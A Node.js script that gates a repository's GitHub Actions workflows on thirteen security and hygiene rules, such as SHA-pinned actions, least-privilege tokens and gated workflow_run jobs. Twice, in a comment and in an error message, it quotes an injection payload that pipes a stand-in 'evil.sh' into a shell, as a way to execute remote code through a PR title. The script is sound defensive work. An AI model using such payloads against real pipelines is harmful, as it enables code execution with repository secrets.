#!/usr/bin/env node
/**
 * CI/CD pipeline gate.
 *   1. timeout-minutes ON EVERY JOB. The default is 360 — six hours of billed
 *      minutes on a hung `npm ci`, or of a stuck electron-builder run.
 *   2. concurrency WITH AN EXPLICIT cancel-in-progress. Omitting the key defaults
 *      it to false, so pushing three commits queues three full runs and the
 *      answer you finally get is for the oldest one.
 *   3. LEAST-PRIVILEGE permissions, DECLARED. With no `permissions:` block the
 *      token inherits the repository default, which for older repos is
 *      read/write on everything — including `contents`, i.e. push access.
 *   4. EVERY `uses:` PINNED TO A COMMIT SHA, with the version in a comment. A tag
 *      is a movable pointer: whoever controls the action repo can repoint `@v5`
 *      at a commit that reads your secrets, and nothing in your workflow changes.
 *      The release workflow has `contents: write` and publishes the installers
 *      users download, so this is the supply chain of the shipped artefact.
 *   5. THE RUNNER IMAGE PINNED. `ubuntu-latest` and `macos-latest` move between
 *      major versions on GitHub's schedule, not yours, and take the preinstalled
 *      toolchain with them — which for a native build (node-llama-cpp,
 *      onnxruntime) means the compiler and the glibc the binaries link against.
 *   6. `npm ci`, NEVER `npm install`. install rewrites the lockfile to satisfy the
 *      ranges; ci fails instead. Only one of those is a check.
 *   7. `cache: npm` ON setup-node. Not correctness, just minutes.
 *   8. EVERY JOB IN A workflow_run WORKFLOW GATES ON conclusion == 'success', AND
 *      — if it checks out code — ON event == 'push'. Two holes behind one `if:`.
 *      The first: workflow_run fires on `completed`, which includes failure,
 *      cancellation and timeout, so without the conclusion gate a red CI run
 *      builds and publishes exactly as a green one does. Branch protection does
 *      not cover this; protection governs what may MERGE.
 *      The second: workflow_run fires after CI COMPLETES, and CI runs on pull
 *      requests, which have not merged and have not been reviewed. `branches:
 *      [main]` does not save you — it matches workflow_run.head_branch, which for
 *      a PR is the HEAD branch, and a fork's default branch is also called
 *      `main`. So a PR from `stranger/leaf:main` reaches a job carrying THIS
 *      repository's token and `contents: write`, and rule 9 then dutifully checks
 *      out the fork's commit and builds it — into a signed release asset.
 *   9. checkout PINNED TO workflow_run.head_sha. Under workflow_run,
 *      `github.sha` is the default branch's HEAD when the event fired, not the
 *      commit CI validated. They differ precisely when commits land fast — when
 *      you can least afford to ship something untested.
 *  10. NO UNTRUSTED INPUT SPLICED INTO A `run:` BLOCK. `${{ }}` is textual
 *      substitution performed before the shell sees the script, so a PR titled
 *      `"; curl evil.sh | sh #` runs as the workflow. Pass it through `env:`,
 *      where it is data. (pr-title.yml already does this — the rule keeps it so.)
 *  11. EVERY `npm run` A WORKFLOW INVOKES EXISTS. Renaming a script is a one-line
 *      change in package.json that breaks CI from a file nobody opened.
 *  12. EVERY GATE SCRIPT IS WIRED IN, AT ALL THREE LEVELS: to a package.json
 *      script, into `ci:check`, and to a step in ci.yml. This is the one that
 *      protects the other eleven — and the one that catches a gate imported into
 *      the tree and never connected to anything, which passes forever because
 *      nothing ever runs it.
 *  13. THE CI NODE VERSION SATISFIES engines.node. Nothing reads `engines` during
 *      a workflow, so the two drift silently: CI proves the app works on the
 *      major IT installs, while `engines` tells contributors and `npm ci` a
 *      different one is enough. Whichever is lower is the one nobody tests.               → check-refactoring.mjs
 */
import fs from 'node:fs';
import path from 'node:path';
import YAML from 'yaml';
import { REPO_ROOT as ROOT } from '../lib/repo-root.mjs';

const WORKFLOW_DIR = '.github/workflows';
const ACTIONS_DIR = '.github/actions';
const CHECKS_DIR = 'scripts/check';
const CI_WORKFLOW = `${WORKFLOW_DIR}/ci.yml`;

const failures = [];
const fail = (file, what, why) => failures.push({ file, what, why });
const read = (rel) => fs.readFileSync(path.join(ROOT, rel), 'utf8');

const workflowFiles = fs
    .readdirSync(path.join(ROOT, WORKFLOW_DIR))
    .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))
    .sort();

if (!workflowFiles.length) {
    fail(WORKFLOW_DIR, 'no workflow files found', 'Every section below would pass vacuously. Did the directory move?');
}

const workflows = [];
const parked = [];

for (const f of workflowFiles) {
    const rel = `${WORKFLOW_DIR}/${f}`;
    const src = read(rel);
    let doc;
    try {
        doc = YAML.parse(src);
    } catch (err) {
        fail(rel, `is not valid YAML (${err.message.split('\n')[0]})`, 'This gate cannot inspect it, so every rule below is silently blind to this file. Fix the syntax.');
        continue;
    }
    if (doc && typeof doc === 'object') workflows.push({ rel, src, doc });
    else parked.push(rel);
}

const actionFiles = fs.existsSync(path.join(ROOT, ACTIONS_DIR))
    ? fs
          .readdirSync(path.join(ROOT, ACTIONS_DIR), { withFileTypes: true })
          .filter((e) => e.isDirectory())
          .flatMap((e) => ['action.yml', 'action.yaml'].map((f) => `${ACTIONS_DIR}/${e.name}/${f}`))
          .filter((rel) => fs.existsSync(path.join(ROOT, rel)))
          .sort()
    : [];

const actions = [];

for (const rel of actionFiles) {
    const src = read(rel);
    try {
        const doc = YAML.parse(src);
        if (doc && typeof doc === 'object') actions.push({ rel, src, doc });
    } catch (err) {
        fail(rel, `is not valid YAML (${err.message.split('\n')[0]})`, 'Every workflow that calls this action fails at the `uses:` step, before running anything. Fix the syntax.');
    }
}

const triggersOf = (doc) => doc.on ?? doc.true ?? {};
const jobsOf = (doc) => Object.entries(doc.jobs ?? {});
const stepsOf = (job) => (Array.isArray(job.steps) ? job.steps : []);

const stepSources = [
    ...workflows.map(({ rel, src, doc }) => ({ rel, src, jobs: jobsOf(doc) })),
    ...actions.map(({ rel, src, doc }) => ({ rel, src, jobs: [[path.basename(path.dirname(rel)), doc.runs ?? {}]] })),
];

const lineOf = (src, needle) => src.slice(0, src.indexOf(needle)).split('\n').length;
const isWorkflowRun = (doc) => Boolean(triggersOf(doc).workflow_run);

// ── 1. timeout-minutes on every job ─────────────────────────────────────────
for (const { rel, doc } of workflows) {
    for (const [name, job] of jobsOf(doc)) {
        if (job['timeout-minutes'] === undefined) {
            fail(
                rel,
                `job \`${name}\` has no timeout-minutes`,
                'The default is 360. A hung step burns six hours of runner time before anyone finds out, and on a hosted runner that is billed. Scale it to the work: ~5 for checks, 15 for an image build, 40 for anything downloading models.',
            );
        }
    }
}

// ── 2. concurrency with an explicit cancel-in-progress ──────────────────────
for (const { rel, doc } of workflows) {
    const group = doc.concurrency;
    if (group === undefined) {
        fail(
            rel,
            'declares no `concurrency`',
            'Three pushes in a minute queue three complete runs, and the last answer to arrive is for the oldest commit. Group by ref (or by branch, for workflow_run) so a newer run supersedes a stale one.',
        );
        continue;
    }
    if (typeof group !== 'object' || group['cancel-in-progress'] === undefined) {
        fail(
            rel,
            '`concurrency` does not set `cancel-in-progress`',
            'Omitting the key defaults it to false — runs serialise instead of superseding. Set it explicitly either way: true for checks and builds, false for anything destructive like a registry prune, where cancelling half-way leaves the mess it was cleaning.',
        );
    }
}

// ── 3. Least-privilege permissions, declared ────────────────────────────────
for (const { rel, doc } of workflows) {
    if (doc.permissions === undefined) {
        fail(
            rel,
            'declares no top-level `permissions`',
            'The GITHUB_TOKEN then inherits the repository default, which on repos created before 2023 is read/write across every scope — including `contents`, meaning any compromised step can push to main. Start from `contents: read` and add only what a job needs.',
        );
        continue;
    }
    if (doc.permissions === 'write-all') {
        fail(rel, '`permissions: write-all`', 'That is every scope at once — the opposite of the rule. Enumerate the scopes actually used.');
    }
    for (const [name, job] of jobsOf(doc)) {
        if (job.permissions === 'write-all') {
            fail(rel, `job \`${name}\` sets \`permissions: write-all\``, 'Enumerate the scopes this job actually uses.');
        }
    }
}

// ── 4. Every `uses:` pinned to a commit SHA ─────────────────────────────────
const USES_LINE = /^[^\S\n]*(?:-[^\S\n]+)?uses:[^\S\n]*(\S+)[^\S\n]*(#.*)?$/gm;

for (const { rel, src } of [...workflows, ...actions]) {
    for (const m of src.matchAll(USES_LINE)) {
        const [, ref, comment] = m;
        if (ref.startsWith('./') || ref.startsWith('docker://')) continue;
        const line = src.slice(0, m.index).split('\n').length;
        const at = ref.lastIndexOf('@');
        const version = at === -1 ? null : ref.slice(at + 1);
        if (!version || !/^[0-9a-f]{40}$/.test(version)) {
            fail(
                rel,
                `line ${line}: \`${ref}\` is pinned to ${version ? `the tag \`${version}\`` : 'nothing'}`,
                'A tag is a movable pointer. Whoever controls that repository can repoint it at a commit that exfiltrates every secret this workflow can see, and your file does not change by one character. Pin the 40-character commit SHA.',
            );
        } else if (!comment) {
            fail(
                rel,
                `line ${line}: \`${ref}\` is SHA-pinned but has no version comment`,
                'A bare 40-character hash tells a reader nothing about how old the pin is or whether an upgrade is due. Add `# v5` (or the exact release) beside it.',
            );
        }
    }
}

// ── 5. The runner image pinned ──────────────────────────────────────────────
/**
 * `runs-on` is resolved through the matrix, not just read literally. The release
 * build is a matrix job (`runs-on: ${{ matrix.os }}`), so a literal-only check
 * skips exactly the jobs that compile native modules — node-llama-cpp and
 * onnxruntime — where the image change is not a broken label but a different
 * compiler and a different glibc linked into a shipped installer.
 */
const runnersOf = (job) => {
    const declared = job['runs-on'];
    const values = [];

    if (typeof declared === 'string' && !declared.includes('${{')) return [declared];

    const matrix = job.strategy?.matrix;
    if (matrix === undefined || typeof declared !== 'string') return values;

    const key = declared.match(/matrix\.([\w-]+)/)?.[1];
    if (key === undefined) return values;

    if (Array.isArray(matrix[key])) values.push(...matrix[key].filter((v) => typeof v === 'string'));
    for (const entry of Array.isArray(matrix.include) ? matrix.include : []) {
        if (typeof entry?.[key] === 'string') values.push(entry[key]);
    }
    return values;
};

for (const { rel, src, doc } of workflows) {
    for (const [name, job] of jobsOf(doc)) {
        const runners = runnersOf(job);
        if (runners.length === 0 && typeof job['runs-on'] === 'string' && job['runs-on'].includes('${{')) {
            fail(
                rel,
                `job \`${name}\` has a computed \`runs-on\` this gate cannot resolve (\`${job['runs-on']}\`)`,
                'The image is then unchecked. Point it at a matrix key this gate can read, or pin it literally — an unresolvable runner is an unpinned one as far as review is concerned.',
            );
            continue;
        }
        for (const runner of runners) {
            if (/-latest$/.test(runner)) {
                fail(
                    rel,
                    `job \`${name}\` runs on \`${runner}\` (line ${lineOf(src, runner)})`,
                    "The `-latest` label is repointed at a new major on GitHub's schedule, taking the whole preinstalled toolchain with it — so a green pipeline starts failing, or starts linking a shipped binary against a different glibc, on a day you changed nothing. Pin the image, e.g. `ubuntu-24.04` or `macos-15`.",
                );
            }
        }
    }
}

// ── 6. npm ci, never npm install ────────────────────────────────────────────
for (const { rel, src, jobs } of stepSources) {
    for (const [name, job] of jobs) {
        for (const step of stepsOf(job)) {
            if (typeof step.run !== 'string') continue;
            if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
                fail(
                    rel,
                    `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0])})`,
                    'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
                );
            }
        }
    }
}

// ── 7. cache: npm on setup-node ─────────────────────────────────────────────
for (const { rel, jobs } of stepSources) {
    for (const [name, job] of jobs) {
        for (const step of stepsOf(job)) {
            if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/setup-node@')) continue;
            if (step.with?.cache !== 'npm') {
                fail(
                    rel,
                    `job \`${name}\` sets up Node without \`cache: npm\``,
                    'Every run then re-downloads the whole dependency tree from the registry. Not a correctness problem, just a minute or two of every single run, forever.',
                );
            }
        }
    }
}

// ── 8. workflow_run jobs gate on conclusion, and on event where they check out ──
/**
 * Followed through `needs:` on purpose. The imported version of this rule checked
 * each job's own `if:`, on the stance that a condition you can read beats one you
 * have to derive — but release.yml is built the other way round: one `version` job
 * carries the full gate (conclusion, event, and head_repository == this repo) and
 * everything else `needs` it. Demanding the same three-clause condition on all
 * four jobs would mean maintaining it in four places, which is its own drift risk.
 * A job is gated if it, or anything in its transitive `needs` closure, is gated —
 * and removing a `needs:` edge shrinks the closure, so this still fails loudly the
 * moment a job is detached from its gatekeeper.
 */
for (const { rel, doc } of workflows) {
    if (!isWorkflowRun(doc)) continue;

    const jobs = new Map(jobsOf(doc));
    const needsOf = (job) => (Array.isArray(job?.needs) ? job.needs : typeof job?.needs === 'string' ? [job.needs] : []);

    /** Every condition governing this job, its own plus every ancestor's. */
    const conditionClosure = (name, seen = new Set()) => {
        if (seen.has(name)) return '';
        seen.add(name);
        const job = jobs.get(name);
        if (job === undefined) return '';
        const own = typeof job.if === 'string' ? job.if : '';
        return [own, ...needsOf(job).map((dep) => conditionClosure(dep, seen))].join(' && ');
    };

    for (const [name, job] of jobs) {
        const cond = conditionClosure(name);
        const via = needsOf(job).length > 0 ? ` (nor anything it needs: ${needsOf(job).join(', ')})` : '';

        if (!/workflow_run\.conclusion\s*==\s*'success'/.test(cond)) {
            fail(
                rel,
                `job \`${name}\` does not gate on \`workflow_run.conclusion == 'success'\`${via}`,
                'workflow_run fires on `completed`, which includes failure, cancellation and timeout. Branch protection does not help — it governs merges. Without this `if`, a red CI run publishes a release exactly like a green one.',
            );
        }

        // Only a job that checks out code can be made to execute someone else's
        // commit. A workflow_run job that just flips a draft flag has nothing to
        // load, so demanding the event gate there would be noise.
        const checksOut = stepsOf(job).some(
            (step) => typeof step.uses === 'string' && step.uses.startsWith('actions/checkout@'),
        );
        if (checksOut && !/workflow_run\.event\s*==\s*'push'/.test(cond)) {
            fail(
                rel,
                `job \`${name}\` checks out code without gating on \`workflow_run.event == 'push'\`${via}`,
                "workflow_run fires after CI COMPLETES, not after a merge, and CI runs on unmerged pull requests. `branches: [main]` does not filter them out: it matches workflow_run.head_branch, which for a PR is the head branch, and a fork's default branch is also called `main`. A fork PR therefore reaches this job — which holds this repository's token and `contents: write` — and rule 9 checks out the fork's commit and builds it into a release asset. Add `github.event.workflow_run.event == 'push'`, which only someone with write access can produce.",
            );
        }
    }
}

// ── 9. checkout pinned to workflow_run.head_sha ─────────────────────────────
for (const { rel, doc } of workflows) {
    if (!isWorkflowRun(doc)) continue;
    for (const [name, job] of jobsOf(doc)) {
        for (const step of stepsOf(job)) {
            if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/checkout@')) continue;
            const ref = step.with?.ref;
            if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
                fail(
                    rel,
                    `job \`${name}\` checks out ${ref ? `\`${ref}\`` : 'the default ref'}`,
                    'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so the build that ships is of code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
                );
            }
        }
    }
}

// ── 10. No untrusted input spliced into a `run:` block ──────────────────────
const UNTRUSTED = [
    'github.event.pull_request.title',
    'github.event.pull_request.body',
    'github.event.pull_request.head.ref',
    'github.event.pull_request.head.repo.description',
    'github.event.issue.title',
    'github.event.issue.body',
    'github.event.comment.body',
    'github.event.review.body',
    'github.event.review_comment.body',
    'github.event.discussion.title',
    'github.event.discussion.body',
    'github.event.head_commit.message',
    'github.event.head_commit.author.name',
    'github.event.head_commit.author.email',
    'github.event.workflow_run.head_branch',
    'github.head_ref',
];

for (const { rel, src, jobs } of stepSources) {
    for (const [name, job] of jobs) {
        for (const step of stepsOf(job)) {
            if (typeof step.run !== 'string') continue;
            for (const field of UNTRUSTED) {
                if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
                fail(
                    rel,
                    `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0])})`,
                    `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
                );
            }
        }
    }
}

// ── 11. Every `npm run` a workflow invokes exists ───────────────────────────
const rootPkg = JSON.parse(read('package.json'));
const rootScripts = new Set(Object.keys(rootPkg.scripts ?? {}));

// Single manifest — this repo is not a workspace root, so `npm -w` never appears.
const NPM_RUN = /\bnpm\s+run\s+([\w:@./-]+)/g;

for (const { rel, jobs } of stepSources) {
    for (const [name, job] of jobs) {
        for (const step of stepsOf(job)) {
            if (typeof step.run !== 'string') continue;
            for (const [, script] of step.run.matchAll(NPM_RUN)) {
                if (!rootScripts.has(script)) {
                    fail(
                        rel,
                        `job \`${name}\` runs \`npm run ${script}\`, which is not a script in package.json`,
                        'Renaming a script is a one-line edit that breaks CI from a file nobody had open. The failure surfaces on the next push, at whatever step happened to reference it.',
                    );
                }
            }
        }
    }
}

// ── 12. Every gate script is wired in, all three levels ─────────────────────
const gateScripts = fs
    .readdirSync(path.join(ROOT, CHECKS_DIR))
    .filter((f) => f.startsWith('check-') && f.endsWith('.mjs'))
    .sort()
    .map((f) => `${CHECKS_DIR}/${f}`);

if (!gateScripts.length) {
    fail(CHECKS_DIR, 'contains no check-*.mjs scripts', 'This section would pass vacuously. Did the directory move?');
}

const ciCheck = rootPkg.scripts?.['ci:check'] ?? '';
if (!ciCheck) {
    fail('package.json', 'has no `ci:check` script', 'It is the one command that runs every gate locally. Without it each gate has to be remembered individually, which is the same as not having them.');
}

const ciWorkflow = workflows.find((w) => w.rel === CI_WORKFLOW);
if (!ciWorkflow) {
    fail(CI_WORKFLOW, 'missing', 'Nothing runs the gates on push, so all of them are advisory.');
}
const ciRuns = ciWorkflow ? jobsOf(ciWorkflow.doc).flatMap(([, job]) => stepsOf(job).map((s) => s.run).filter((r) => typeof r === 'string')).join('\n') : '';

for (const gate of gateScripts) {
    const entry = Object.entries(rootPkg.scripts ?? {}).find(([, cmd]) => cmd.includes(gate));
    if (!entry) {
        fail(gate, 'is not invoked by any package.json script', 'Nothing can run it, so the standard it encodes is enforced by nobody. Add a `<domain>:check` script for it.');
        continue;
    }
    const [scriptName] = entry;
    if (!new RegExp(`\\bnpm run ${scriptName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(ciCheck)) {
        fail('package.json', `\`ci:check\` does not run \`${scriptName}\` (${gate})`, 'The gate exists and is skipped locally. Chain it into ci:check so one command still means "everything".');
    }
    if (ciWorkflow && !new RegExp(`\\bnpm run ${scriptName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(ciRuns)) {
        fail(CI_WORKFLOW, `has no step running \`${scriptName}\` (${gate})`, 'The gate exists and is skipped on push, so a violation reaches main and is only caught by whoever happens to run ci:check locally.');
    }
}

// ── 13. The CI node version satisfies engines.node ──────────────────────────
const enginesNode = rootPkg.engines?.node;

if (typeof enginesNode !== 'string') {
    fail('package.json', 'declares no `engines.node`', 'It is the only statement of which Node majors this app supports, and what `npm ci` checks a contributor against.');
} else {
    const floor = Number(enginesNode.match(/(\d+)/)?.[1]);

    /** Every `node-version:` a workflow or composite action asks setup-node for. */
    const nodeVersions = new Map();
    for (const { rel, src } of [...workflows, ...actions]) {
        for (const m of src.matchAll(/node-version:\s*'?"?(\d+)/g)) nodeVersions.set(rel, Number(m[1]));
    }

    if (nodeVersions.size === 0) {
        fail(ACTIONS_DIR, 'no `node-version:` found in any workflow or action', 'Without one setup-node picks whatever the runner image ships, so the tested major changes when the image does.');
    }

    for (const [rel, major] of nodeVersions) {
        if (major < floor) {
            fail(
                rel,
                `installs Node ${major}, below the \`engines.node\` floor of ${enginesNode}`,
                'CI is proving the app works on a major the manifest says is unsupported, and nothing tests the one it claims to require.',
            );
        } else if (major > floor) {
            fail(
                rel,
                `installs Node ${major} while \`engines.node\` is "${enginesNode}"`,
                `Nothing tests Node ${floor}, yet npm lets a contributor install on it — and a native module built against ${major} is the failure they would hit. Raise engines.node to ">=${major}", or pin CI to ${floor}.`,
            );
        }
    }
}

// ── Report ──────────────────────────────────────────────────────────────────
if (failures.length) {
    console.error(`\n✖ ${failures.length} pipeline standard violation(s):\n`);
    for (const { file, what, why } of failures) {
        console.error(`  ${file}: ${what}`);
        console.error(`    → ${why}\n`);
    }
    console.error('Fix these, then re-run.');
    process.exit(1);
}

const jobCount = workflows.reduce((n, w) => n + jobsOf(w.doc).length, 0);
const pinned = [...workflows, ...actions].reduce((n, w) => n + [...w.src.matchAll(USES_LINE)].length, 0);
console.log(
    `✓ Pipeline OK — ${workflows.length} workflow(s), ${jobCount} jobs, all timed out and concurrency-grouped with least-privilege permissions, ${pinned} action(s) SHA-pinned across workflows and ${actions.length} composite action(s), runners pinned (matrix included), every workflow_run job gated on success and pinned to head_sha with every checkout job gated on a push event, no untrusted input spliced into a shell, and all ${gateScripts.length} gate scripts wired into ci:check and ci.yml.${parked.length ? ` ${parked.length} parked workflow(s) skipped: ${parked.join(', ')}.` : ''}`,
);
console.log(
    '\nNot machine-checked: whether branch protection actually requires the CI check, or whether the release signing story is what the README claims. Those live in repository settings, not in the tree.',
);
